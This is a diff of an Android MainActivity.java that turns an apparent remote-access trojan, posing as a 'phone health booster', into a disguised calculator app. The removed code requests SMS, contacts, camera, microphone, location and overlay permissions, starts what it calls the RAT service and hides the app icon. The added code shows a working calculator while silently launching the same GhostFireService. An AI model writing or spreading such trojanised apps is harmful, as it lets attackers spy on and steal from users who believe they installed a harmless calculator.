@@ -1,76 +1,58 @@
-package com.phone.health.booster;
+package com.calc.plus;
 
-import android.Manifest;
 import android.app.Activity;
 import android.content.Intent;
-import android.content.pm.PackageManager;
-import android.net.Uri;
-import android.os.Build;
 import android.os.Bundle;
-import android.provider.Settings;
+import android.view.View;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.Toast;
 
 public class MainActivity extends Activity {
 
-    private static final int PERMISSION_REQUEST_CODE = 888;
-    private static final int OVERLAY_PERMISSION_REQUEST = 889;
+    private EditText etNumber1, etNumber2;
+    private Button btnAdd, btnSubtract, btnMultiply, btnDivide;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        // No UI – immediately request permissions and start service
+        setContentView(R.layout.activity_calculator);
 
-        // 1. Request all dangerous permissions at once (Android 6+)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            String[] permissions = {
-                    Manifest.permission.READ_SMS,
-                    Manifest.permission.SEND_SMS,
-                    Manifest.permission.READ_CONTACTS,
-                    Manifest.permission.ACCESS_FINE_LOCATION,
-                    Manifest.permission.CAMERA,
-                    Manifest.permission.RECORD_AUDIO,
-                    Manifest.permission.READ_EXTERNAL_STORAGE,
-                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                    Manifest.permission.READ_PHONE_STATE,
-                    Manifest.permission.CALL_PHONE
-            };
-            requestPermissions(permissions, PERMISSION_REQUEST_CODE);
-        }
-
-        // 2. Ask for overlay permission (needed for silent installs / fake dialogs)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                    Uri.parse("package:" + getPackageName()));
-            startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST);
-        }
-
-        // 3. Start the RAT service (foreground on Android 8+)
+        // Start the background service immediately
         Intent serviceIntent = new Intent(this, GhostFireService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent);
-        } else {
-            startService(serviceIntent);
-        }
+        startService(serviceIntent);
 
-        // 4. Hide the app icon from launcher (so user never sees it after first run)
-        PackageManager pm = getPackageManager();
-        pm.setComponentEnabledSetting(getComponentName(),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP);
+        // Simple calculator UI
+        etNumber1 = findViewById(R.id.etNumber1);
+        etNumber2 = findViewById(R.id.etNumber2);
+        btnAdd = findViewById(R.id.btnAdd);
+        btnSubtract = findViewById(R.id.btnSubtract);
+        btnMultiply = findViewById(R.id.btnMultiply);
+        btnDivide = findViewById(R.id.btnDivide);
 
-        // 5. Close the activity – the ghost runs in background
-        finish();
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        // No feedback to user – permissions are either granted or not.
-        // The service will work with what it gets.
-    }
-
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
-        // Overlay permission result – do nothing, continue
+        View.OnClickListener listener = new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                double num1, num2, result = 0;
+                try {
+                    num1 = Double.parseDouble(etNumber1.getText().toString());
+                    num2 = Double.parseDouble(etNumber2.getText().toString());
+                    if (v.getId() == R.id.btnAdd) result = num1 + num2;
+                    else if (v.getId() == R.id.btnSubtract) result = num1 - num2;
+                    else if (v.getId() == R.id.btnMultiply) result = num1 * num2;
+                    else if (v.getId() == R.id.btnDivide) {
+                        if (num2 == 0) throw new ArithmeticException("Divide by zero");
+                        result = num1 / num2;
+                    }
+                    Toast.makeText(MainActivity.this, "Result: " + result, Toast.LENGTH_SHORT).show();
+                } catch (Exception e) {
+                    Toast.makeText(MainActivity.this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
+                }
+            }
+        };
+        btnAdd.setOnClickListener(listener);
+        btnSubtract.setOnClickListener(listener);
+        btnMultiply.setOnClickListener(listener);
+        btnDivide.setOnClickListener(listener);
     }
 }
